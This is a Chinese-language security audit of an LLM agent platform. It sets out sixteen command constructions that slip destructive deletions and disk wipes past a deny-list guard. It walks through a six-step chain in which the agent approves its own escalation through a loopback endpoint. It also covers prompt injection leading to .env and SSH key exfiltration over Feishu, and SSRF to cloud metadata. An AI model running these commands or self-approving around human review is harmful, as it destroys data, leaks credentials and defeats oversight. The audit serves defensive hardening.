## 0. 一句话结论

这套系统的**外部认证面做得相当扎实**（trusted-local 双条件、Origin 闸门、constant-time 比较、路径 contained、上传无 zip slip、HTML 预览有沙箱），
真正的问题不在"墙"，而在**墙内**：

1. **最后一道防毁灭闸门（`CatastrophicGuard`）可被 16 类构造绕过**，其中 `cd ~ && rm -rf .`、根内容通配清零这类"主目录/根清零"正是它自称要拦的形态（实测判定函数全部返回 ALLOW）。
2. **"人类审批"在系统内部可被 agent 自己完成**：`POST /api/v1/escalation/review` 无人类因子、回环直连免认证，`decided_by` 还被硬编码成 `web_panel` —— 审计日志会把模型的自批写成"人工已批"。
3. **任何一次 Web 会话 ≈ 该机器完全控制权**：工作区默认就是仓库根，文件面板可读 `.env`（实测 200/808B）、`data/` 全部会话；`DELETE /api/v1/fs/delete?path=.&confirm=true` 会删掉整个工作区根；`POST /api/v1/workspaces {"path":"/"}` 能把整盘变成工作区。
4. **出站没有统一闸门**：飞书主动出站白名单是 fail-open（空=全放行，与 docstring 相反），`send_feishu_attachment` 可把 `.env`/`~/.ssh/id_rsa` 发到任意 `open_id`；浏览器 `navigate` 只校验 scheme，可直驱 `127.0.0.1`、内网、云元数据地址，且使用真实 Chrome profile 时携带用户全部登录态。

一句话行动：**先补"毁灭面"（P0 的 5 项），再补"外泄面"（P1），最后做"架构收敛"（P2：不依赖 deny-list 的系统级隔离 + 统一出站闸门）。**

## 2. 威胁模型与信任边界

### 2.1 攻击者分层

| 编号 | 攻击者 | 能力 | 是否在威胁模型内 |
|---|---|---|---|
| A0 | 公网匿名 | 只能发 HTTP 请求 | ✅ 主张内（隧道暴露） |
| A1 | 持有 Web 会话者 | 可调全部 `/api/v1/*`，含文件、工作区、审批端点 | ✅ 主张内 |
| A2 | 模型自身 / 被提示注入的模型 | 可调用全部工具（shell、文件、浏览器、飞书、子代理） | ✅ **主张内，且是最高频主体** |
| A3 | 同机低权进程 | 回环直连（默认免认证） | ⚠️ 半信任：可防则防 |
| A4 | 仓库内不可信内容（网页、文件、SKILL.md、experience 卡） | 进入上下文即成为"指令" | ✅ 主张内 |

### 2.2 关键信任边界

```
浏览器/API ──[认证: cookie|bearer, Origin 闸门]──► FastAPI 路由
                                                        │
                                              [工具层: schema + 白名单 + CatastrophicGuard]
                                                        │
                                              [执行层: shell / 文件 / 浏览器 / 出站]
                                                        │
                                                   宿主操作系统
```

**本次审查的核心判断：第 3 层（工具层）承担了它承担不了的职责。**
`CatastrophicGuard` 是正则/分词级 deny-list，而执行层是 `shell=True` 裸执行、默认 `EXEC_SANDBOX=none`（`config.py:52`，已读码确认）。
用 deny-list 守"不可逆破坏"，等价于用关键词过滤守内存安全：**必然会漏**。第 8 节的 P0 修复因此不是"再补几条正则"，而是"改判定基准 + fail-closed"。

### 2.3 本次未采用的"伪结论"（避免误导修复方向）

- ❌ "有认证就够了" —— 认证只区分"谁"，不限制"干什么"；A1/A2 都能把整机清零。
- ❌ "S0 需要外部攻击者" —— 本次 S0 的主体是 A2（模型/注入），不需要任何外部入口。
- ❌ "deny-list 补全就能防住" —— 见 GY-01~GY-16：每一种补丁都能被下一种等价构造绕过，必须换判定基准（祖先关系 + 结构化执行 + 系统级隔离）。

## 3. S0 级发现（立即处置）

### S0-1 灾难命令硬阻断可被 16 类构造绕过——"主目录/根内容清零"全放行

**位置**：`src/llm_loop/tools/safety.py`
- `safety.py:193-209`：相对目标用 **guard 进程自身** `os.getcwd()` 解析
- `safety.py:323-325`：只取 `args["command"]`，**`workdir` 完全不进入判定**
- `safety.py:99-122`：按 `;|&` 切段后**逐段独立判定，不跨段跟踪 `cd`**
- `safety.py:86-96`：`_expand` 只展开 guard 进程 `os.environ` 里的变量
- `safety.py:6-12`：模块 docstring 自述"已知灾难模式的硬阻断，不是完备沙箱"
- 执行侧：`execute_command.py:621-628` `shell=True` 裸执行；`config.py:52` `exec_sandbox="none"`（默认无任何系统级隔离）

**攻击路径（A2 主体，无需外部入口）**：
模型或被注入的模型 → `execute_command` → guard 判定 ALLOW → shell 执行 → 不可逆破坏。
默认部署下 guard 是**唯一**边界，所以这里每一条漏判都直接等于"零防护"。

**实测证据（本会话直接调用 `CatastrophicGuard.guard()` 判定函数，未执行任何命令）**

| 编号 | 命令模板 | 载荷 | 判定 | 根因 |
|---|---|---|---|---|
| GY-01 | `cd ~ && rm -rf .` | — | **ALLOW** | 不跟踪 `cd`；`.` 按 guard cwd 解析且落在 home 子树（豁免） |
| GY-02 | `rm -rf .`（`workdir=/Users/<user>`） | — | **ALLOW** | `workdir` 不参与判定 |
| GY-03 | `cd /etc && rm -rf ./` | — | **ALLOW** | 同 GY-01，相对路径豁免绕过绝对路径黑名单 |
| GY-04 | `env TARGET=<dir> sh -c 'rm -rf $TARGET'` | `/etc` | **ALLOW** | `_expand` 用 guard 环境，未见 `TARGET` → 目标为字面 `$TARGET`（相对） |
| GY-05 | `rm${IFS}-rf${IFS}` | `/etc` | **ALLOW** | 分词不展开 `${IFS}`，单 token 不匹配任何模式 |
| GY-06 | `cd / && rm -rf *` | — | **ALLOW** | 通配符未展开、未识别为"根内容" |
| GY-07 | `rm -rf` | `/*` | **ALLOW** | 同上：`/*` 不等于根本体，canonical 后仍非根 |
| GY-08 | `rm -rf` | `/Users` | **ALLOW** | `_SYSTEM_DIRS` 只有 `/home`，**macOS 缺 `/Users`** |
| GY-09 | `rm -rf` | `/System/Volumes/Data` | **ALLOW** | 系统目录判定缺 `/System`（数据卷=全部用户数据） |
| GY-10 | `dd if=/dev/zero of=` | `/dev//<disk>` | **ALLOW** | 块设备正则与路径归一不等价（`//`） |
| GY-11 | `echo x \| tee` | `/etc//<file>` | **ALLOW** | 同上 |
| GY-12 | `/bin/busybox rm -rf` | `/etc` | **ALLOW** | 包装器 argv0 未纳入 `_execution_tokens` |
| GY-13 | `echo <dir> \| xargs rm -rf` | `/etc` | **ALLOW** | 管道切段后 xargs 段 argv0 ≠ `rm` |
| GY-14 | `perl -e 'system("rm -rf")'` | `/etc` | **ALLOW** | 仅递归 shell/python 载荷，未覆盖 perl/ruby/node/awk |
| GY-15 | `echo <b64> \| base64 -d` 再管道给 shell | — | **ALLOW** | 现有"下载器管道执行"模式只认两个下载器名 |
| GY-16 | `diskutil` 的磁盘擦除子命令 | `JHFS+ <name> <diskN>` | **ALLOW** | macOS 侧"整盘格式化"等价物无任何模式覆盖 |

**对照组（同一函数，证明不是"完全失效"）**：把目标换成根本体、`~`、`/private/etc`、`/home`，以及 `find / -delete`、Python `shutil.rmtree(...)` 形态时，判定均为 BLOCK。
→ 结论：**拦得住"教科书样例"，拦不住"等价构造"**。这正是 deny-list 的结构性上限。

**影响**：不可逆数据丢失（整机/整用户目录/工作区），且模型只需一次错误或一次成功注入。审计虽有落盘（`safety.py:429-445`），但破坏已发生。

**修复（改判定基准，不是补正则）**
1. `guard(command, workdir=...)`：签名接收 `workdir`，**相对目标一律以 workdir 为基准**；含 `cd` 的复合命令跨段维护 cwd 状态，无法机械确定时 **fail-closed**。
2. 目标判定从"字符串黑名单"改为**祖先/后代关系集合**：
   - `target == Path(target.anchor)`、`target == Path.home()`、`Path.home().parent`（macOS `/Users`）
   - `target.is_relative_to("/System")`、`("/Library")`、`("/private")`、`("/usr")`、`("/var")`、`("/bin")`、`("/sbin")`、`("/opt")`、`("/Applications")`、`("/boot")`
   - 先 `resolve()` 再比较（消除 `/private` 前缀化与 symlink 影响）
3. 含通配元字符（`*`、`?`、`[`）且命中删除/改写类命令时：展开为"是否覆盖受保护祖先"判定；无法展开 → **fail-closed**。
4. 补包装器/解释器：`busybox`、`xargs`、`timeout`、`nice`、`stdbuf`、`env`、`perl/ruby/node/awk -e`、`base64 -d` 后管道给 shell 的形态。
5. `EXEC_SANDBOX=none` 时，`execute_command` 的工具描述必须输出事实行"无系统级隔离，仅 deny-list 尽力拦截"，撤回"硬阻断/已生效"式措辞（对齐 RULE-AI-35）。

**验收用例（必须全部 BLOCKED）**：GY-01…GY-16 全表 + 现有对照组；
**回归用例（必须仍 ALLOWED，防误伤）**：项目内构建产物清理、依赖目录清理、`__pycache__` 清理。

### S0-2 "人工审批"可被 agent 自身闭环完成，且审计被伪造成"人工已批"

**位置**：
- `src/llm_loop/web/routes.py:2656-2700`：`POST /api/v1/escalation/review`，无任何"人类因子"校验
- `src/llm_loop/web/schemas.py:482-490`：请求体仅 `{id, decision, note, ttl_minutes}`
- 审批落地：`store.decide(..., decided_by="web_panel", ...)` —— **来源被硬编码为"web_panel"**
- 鉴权：该端点挂在 `require_api_key` 路由下，但**回环来源直接免认证**（`auth.py:428-446`；实测 `Host: 127.0.0.1` → `/api/v1/providers` 返回 200）
- 令牌：`tools/escalation.py` 的 `consume(token, tool, command)` 只绑定"工具+命令字符串"，**不绑定"谁批准"**

**完整杀伤链（全部为既有能力，不需要漏洞利用技巧）**

1. 模型决定执行被硬拦的命令（例如把根目录清空）；
2. `execute_command` → guard 硬阻断 → 回执提示 `escalation_request`；
3. 模型调 `escalation_request` → 拿到 `ESC-xxx`；
4. 模型用任意 HTTP 客户端（`execute_command` 内发请求，或 `browser` 工具）向 `http://127.0.0.1:8903/api/v1/escalation/review` 发 `POST`，body：`{"id":"ESC-xxx","decision":"approved"}`。回环 → 免认证 → 200；审计写入 `decided_by="web_panel"`；
5. 模型调 `escalation_wait` → 拿到一次性令牌；
6. 模型带令牌重发同一命令 → 破坏发生。

**影响**：
- 最后一道人类闸门对 A2 完全失效（对真实人类用户仍需登录，但攻击主体本来就是模型）。
- **证据链污染**：`escalation_review_log.jsonl` 与 `escalation_requests.json` 会记录"人工已批准"，事后归因会把模型自批误判为人工决策。这类"审计造假"比破坏本身更难发现。
- 同理，`browser` 工具使用真实 Chrome profile 时，可直接打开 Web UI 点"批准"，连 HTTP 客户端都不需要（见 S1-4）。

**修复**
1. 审批端点引入**人类因子**（建议组合）：
   - 一次性 nonce：由**非 agent 可达通道**签发（本机 TTY 打印 / 飞书私聊下发 / 系统钥匙串），`review` 必须携带且 nonce 与 `id` 绑定；
   - `WebAuthn` / `Touch ID` 断言（浏览器端），服务端验签；
   - 物理隔离：审批结果写入 agent 进程 UID 不可写的路径（不同 UID / 只读挂载）。
2. `decided_by` 必须记录**可核验来源**：`{"channel":"web|tty|feishu","client_ip":...,"ua":...,"loopback":true,"uid":...}`；对 `loopback` 且非人类通道的审批一律降级为"待二次确认"。
3. 命令绑定升级：令牌绑定 `(tool, command, workdir, artifact_sha256, approver)`，TTL ≤ 60s，单次消费（后者已具备）。
4. 审计双写：审批日志 + 不可变审计（agent 无写权限），UI 明确标注"来源通道"。

**验收**：模型仅凭 shell 无法完成上述 6 步；无 nonce 的 `review` 返回 403；审计行含真实通道字段。

## 4. S1 级发现（高）

### S1-1 `path=.` 可删除整个工作区根；危险路径黑名单是死代码

**位置**：`src/llm_loop/web/fs_tree.py`
- `fs_tree.py:40-46` `_DANGEROUS_NAMES` 含 `"/"`、`"."`、`".."`、`".git"` 等
- `fs_tree.py:135-145` 判定用 `target.name in _DANGEROUS_NAMES` 与 `str(target).startswith(_DANGEROUS_ROOT_PATTERNS)`
- `fs_tree.py:148-160` `_resolve_under_root`：`path="."` → `root`（工作区根本体）
- `fs_tree.py:168/194` `fs_delete`：过 `_is_dangerous` 后 `shutil.rmtree(target)`

**实测（函数级，未执行删除）**
```
_resolve_under_root(".", engine) -> /Users/<user>/Project/llm-first-loop-mirror
_is_dangerous(同上)              -> False
```
`Path.name` **永远不可能等于** `"/"`、`"."`、`".."`（根目录的 `name` 是空串，`"."` 已被 resolve 掉）——这三条黑名单因此是**死代码**。
macOS 上 `"/etc"` resolve 成 `"/private/etc"`，前缀黑名单同样失效（该例被工作区包含性检查兜住，仅在 S1-2 把根设为 `/` 时才致命）。

**攻击链**：A1 会话或 A2 模型 → `DELETE /api/v1/fs/delete?path=.&confirm=true` → `rmtree(仓库根)`，一次请求清空代码 + `data/`（全部会话、记忆、证据）。`confirm=true` 是唯一"确认"，而它可由攻击方自己填。

**修复**
1. `fs_delete` 增加根保护：`if target == root or target == Path.home() or target.parent == target: 400`。
2. 把 `_DANGEROUS_NAMES` 从"名字集合"改为**对输入路径本身的显式判定**（`.`、`..`、根本体、`~`、空串），并在 `resolve()` 前后各判一次。
3. 黑名单前缀改用 canonical 集合（`/private/etc`、`/System`、`/Library`、`/Users`…）+ `is_relative_to`。
4. 删除操作改为"两步令牌"：先 `POST /fs/delete/prepare` 返回一次性 `op_id`，确认时校验 `op_id` + 目标摘要；禁止对 `root` 与 `root` 的直接祖先下发 `op_id`。

### S1-2 工作区注册无白名单：`{"path":"/"}` 把整盘变成读写面

**位置**：`src/llm_loop/web/routes.py:4390-4410`（`POST /api/v1/workspaces`）→ `src/llm_loop/workspace/store.py:382-390`
**实测（读码）**：登记校验只有 `not path.is_dir() → ValueError`，**无路径白名单、无确认、无告警**。

**攻击链**：A1/A2 → 注册 `/` → 此后 `preview`/`fs/tree`/`fs/scan`/`fs/delete` 的"根"变成 `/`：
- 读：`/etc/ssh/*`、`~/.ssh/id_*`、其它项目源码（预览/树之外的读面）
- 写：`fs_write`（UI 保存）可写系统任意可写位置
- 删：`fs_delete` 的包含性检查失效（见 S1-1）

**修复**：白名单 = `Path.home()` 子树（可用 `LFL_WORKSPACE_ALLOW_ROOTS` 扩展）；显式拒绝根本体、`~`、`/System`、`/Library`、`/etc`、`/usr`、`/var`；注册与切换均需二次确认并回显绝对路径；`fs_*` 增加"目标必须 `is_relative_to(workspace_root)` 且 `workspace_root` 自身不可删/不可 move"。

### S1-3 飞书主动出站 fail-open + 附件无根约束 = 现成的凭据外泄信道

**位置**：
- `src/llm_loop/introspection/tools_feishu_outbound.py:39`（docstring 明写"默认空=全部拒绝"）
- 实际实现 `:148-149`：`allowed = _get_allowed_users(); if allowed and receive_id not in allowed: reject` —— **空集合直接放行**
- `:300-330` `send_feishu_attachment`：只查 `Path(file_path).exists()/is_file()`，**无工作区约束、无敏感文件拦截**
- 注册：`factory.py:186`（工具确实在模型工具表内）

**实测（读码 + 环境核对）**
- `.env`：`FEISHU_OUTBOUND_ENABLED=true`；`FEISHU_OUTBOUND_ALLOWED_USERS` 行**被注释掉** → 环境变量为空 → 走 fail-open 分支。**当前配置即脆弱态**。
- `FEISHU_APP_ID` / `FEISHU_APP_SECRET` 存在 → 出站可用。

**攻击链（A2，提示注入即可触发）**：网页/文件内容中的注入语 → 模型调 `send_feishu_attachment(receive_id=<攻击者 open_id>, file_path=".env", confirm=true)` → 工作区内所有密钥（`LLM_API_KEY`、`DEEPSEEK_API_KEY`、`GLM_API_KEY`、`FEISHU_APP_SECRET`、`WEB_API_KEY`、`WEB_LOGIN_PASSWORD_HASH`）+ `~/.ssh/id_rsa` 外发成功。`confirm=true` 由模型自填，不构成人类确认。
注意：`.env` 在默认工作区（=仓库根）内，所以"限制在工作区内"这一条**单独不足以修复**，必须叠加敏感文件拒绝名单。

**修复**
1. 反转默认：`if receive_id not in (allowed or set()): reject`，并把"空集合=全拒"写进启动自检（配置缺失时工具直接不可用 + 启动告警）。
2. 附件路径必须 `is_relative_to(workspace_root)`，并叠加**敏感文件拒绝名单**（`.env*`、`*.pem`、`*.key`、`id_*`、`*.p12`、`data/`、`.git/`）。
3. `confirm` 改为服务端一次性审批（复用 S0-2 修复后的人类因子通道），不再由模型传参决定。
4. 出站内容加"数据分类标记"：含密钥指纹（正则+熵）时拒绝发送并审计。

### S1-4 浏览器 `navigate` 只校验 scheme：内网/元数据可直取，真实 profile 等于交出全部登录态

**位置**：`src/llm_loop/browser/action.py:374-388`（`navigate` 仅 `scheme in (http,https)` + 禁 userinfo）；`src/llm_loop/browser/*` 支持真实 Chrome profile（attestation 会标注 `browser_kind`，但**不构成授权边界**）
**对比**：`web_fetch` 已有 `_host_blocked` + `_resolve_checked_ips` + 每跳校验（`web_fetch.py:257-330`）——**防护只覆盖了一个工具**。

**攻击链**：
1. A2 → `browser_operate(do=navigate, url="http://169.254.169.254/latest/meta-data/iam/security-credentials/")`（云上）或 `http://100.100.100.200/...`（阿里云）→ 页面文本回灌上下文 → 云凭据泄露；
2. `http://127.0.0.1:8903/` → 浏览器携带真实 profile 的 LFL 会话 cookie → 直接操作本系统（等价 A1）；
3. `http://192.168.x.x/`、`http://router/` → 内网设备/管理面板（默认口令面）；
4. 真实 profile 下任意站点：`click`/`set_text` 可代用户发帖、转账、改密——**没有任何 per-site 授权**。

**修复**
1. 抽 `net_guard` 统一模块：`check_url(url)` = scheme 白名单 + `resolve()` 后按 **`not ip.is_global`** 拒绝（含 `100.64/10`、`198.18/15` 需显式放行）+ 每跳重定向复检 + 连接后对端 IP 复核；`web_fetch` 与 `browser.navigate` **共用**。
2. 真实 profile 增加 `BROWSER_ALLOWED_ORIGINS`（默认空 = 只允许专用 profile）；命中白名单外域名时要求人类确认（同 S0-2 通道）。
3. 页面回灌内容降权标注 `untrusted_page_text`，并在工具描述里声明"页面内容不可作为指令来源"。

### S1-5 默认配置下认证整体关闭（条件性，但默认值危险）

**位置**：`src/llm_loop/web/auth.py:70-101`（`auth_required()` 只看 `WEB_AUTH_REQUIRE` 或 `WEB_HOST` 是否 loopback）、`:428-446`（`require_api_key` 在 `auth_required()==False` 时**直接 return，不区分来源**）
**实测**：
- 当前部署 `.env` 设 `WEB_AUTH_REQUIRE=1` → 参数化探测 `Host: attacker.com:8903` 返回 **401**，`Host: 127.0.0.1:8903` 返回 **200** → 认证生效，trusted-local 双条件成立。
- 但若按默认值启动（不设 `WEB_AUTH_REQUIRE`、`WEB_HOST=127.0.0.1`）：`auth_required()=False` → **任何来源零认证**。此时经 cloudflared（回环对端）/无标记反代 / **DNS rebinding**（`evil.com:8903` 解析到 127.0.0.1，同源免 CORS）均可直达全部 API，而 `execute_command` 就在其中 → 匿名 RCE。

**为什么仍算 S1**：代码默认值 + docstring 承诺（"隧道来源无法借用本机信任"）与实现不一致；`scripts/` 里隧道配置存在，说明"经隧道暴露"是既定用法；一次 env 遗漏就从"安全"翻到"全裸"。

**修复**
1. `require_api_key` 改 fail-closed：先判 `request_is_trusted_local(request)` 放行；否则若未配置凭据 → 503（附配置指引）；已配置 → 校验 cookie/bearer。即**先证明"可信本地"，再谈"是否需要密钥"**，而不是"未启用认证就放行"。
2. `WEB_HOST` 非 loopback 但未配凭据时**拒绝启动**（启动期硬失败，不要运行期静默放行）。
3. 加 `HostGuard`：`Host` 必须 ∈ {loopback, `WEB_CANONICAL_HOST`, `WEB_ORIGIN_ALLOWLIST`}，否则 421；这是对 DNS rebinding 的独立防线，不依赖认证状态。
4. 修正 docstring 与 README：明确"隧道场景必须设 `WEB_AUTH_REQUIRE=1` 且配凭据"。

## 9. 架构级结论（比单点修复更重要）

### 9.1 三个"错位"

1. **职责错位**：工具层（`CatastrophicGuard`）承担了内核层的职责（不可逆操作的最终否决）。deny-list 是"提示"，不是"边界"；只有 OS 级隔离（bwrap/容器/独立 UID）才是边界。
2. **信任错位**：系统把"回环"当成"人类"。回环只能证明"同机进程"，而本系统最活跃的进程就是 agent 自己。凡是"回环即免认证/免确认"的地方，都等价于"agent 免确认"（S0-2、S1-2、S2-1 同源）。
3. **边界错位**：出站防护做在 `web_fetch` 内部而不是通道层，于是 `browser`、`feishu`、provider 探测各走各的（S1-3、S1-4、S2-2 同源）。

### 9.2 三条可执行原则

- **P-A 一切"不可逆"必须由内核否决，不由字符串否决。** 落地：`bwrap` 默认开 + 删除类操作延迟可撤销。
- **P-B 一切"人类确认"必须有 agent 不可伪造的因子。** 落地：nonce/Touch ID + 来源字段落审计 + 回环审批降级。
- **P-C 一切"出站"必须过同一闸门，默认拒绝。** 落地：`net_guard` + `not ip.is_global` + 域名白名单 + 附件敏感名单。

### 9.3 与既有规则的呼应

- 本次 S0-1 正是 **RULE-AI-35**（门槛/护栏变更必须实测应拦输入才可称"已生效"）缺失的反面案例：`safety.py` 的"硬阻断"从未被 16 类等价构造测过。
- 本次 S0-2 是 **RULE-AI-28**（独立审查/人类闸门）在"审批通道"上的同构问题：闸门存在，但"谁按的按钮"不可验证。
- 建议把第 3 节的 GY 表直接纳入 CI：**每次改 `safety.py` 必须跑 GY 集，任何一条变 ALLOWED 即阻断合并**。
